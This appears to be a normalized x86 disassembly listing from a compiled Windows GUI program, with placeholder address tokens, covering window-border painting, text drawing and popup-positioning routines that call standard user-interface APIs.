cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_43bd21
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43b948
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_435af8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_43bd60
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43697c
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_4343f8
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_43bda8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436b9c
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_43bdd8
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_43b594
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_437b28
xor ecx ecx
push ebp
push sub_43bf07
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_437fc0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_437fc0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bf0e
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_437b30
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_437f84
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_43bf0e
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4032f4
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4032f4
jmp r-xdata
sub_43bfa4
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_435c5c
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_435c5c
sub_43bfe8
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_435c5c
sub_43c038
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_43c0c8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43c32e
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d528
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_4279c8
call sub_427aa8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_4279c8
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_4280c0
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_43c370
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4067a0
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_4345d4
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_438b7c
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_435c5c
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_436e20
sub_43c3dc
push ebx
push esi
mov esi edx
call sub_44b71c
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_40673c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_435c5c
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_40673c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_435c5c
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_43c440
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_438f44
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43c478
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43c470
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43c4b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_433b90
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d644
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43366c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_43c514
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_433c68
test bl bl
jle r-xdata
xor eax eax
call sub_431c60
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_43c554
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d948
xor eax eax
push ebp
push sub_43c5ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41dc3c
xor eax eax
push ebp
push sub_43c5cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c5d3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41dc3c
retn
sub_43c600
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43cef4
mov edx 0x80ffff
mov eax esi
call sub_434c30
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41dadc
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d610
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_43c66c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43811c
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bb5c
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4380b4
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_43c6d8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43c72e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c735
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ReleaseDC
retn
sub_43c73c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43c7d5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41cd28
mov eax ebx
call sub_436dc8
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_434a90
mov eax [ ebp - 0x14 ]
call sub_404374
push eax
mov eax [ ebx + 0x208 ]
call sub_41dbbc
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c7dc
lea eax [ ebp - 0x14 ]
call sub_403eb4
retn
sub_43c7e4
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_43c850
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_43c8db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c8e2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ed8
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_434a90
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41da1c
mov edx eax
add edx 0x6
mov eax esi
call sub_43424c
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_434a90
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41da38
mov edx eax
add edx 0x4
mov eax esi
call sub_434270
sub_43c8e8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_43cac1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_434ac0
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_435d00
mov eax [ esi ]
call sub_451f54
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_451f60
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_451f54
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_451f48
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_451f60
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_451f3c
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_451f48
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_451f3c
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4389c4
push 0x4
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cac8
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404174
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_43fb3c
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_43b290
push eax
call [ rw-data ]
sub_43cad0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43caf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_4125c0
mov eax esi
call sub_436dc8
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404374
push eax
mov eax [ esi + 0x208 ]
call sub_41dbbc
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_43cb54
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_4125c0
call sub_4279c8
call sub_427aa8
test al al
jne r-xdata
call sub_4279c8
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_427d34
push esp
push 0x1
push 0xf
push 0x0
call sub_4279c8
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_427b18
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_43cbc0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4392cc
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_43cbe4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43cc24
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43cce4
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452428
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_422b8c
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
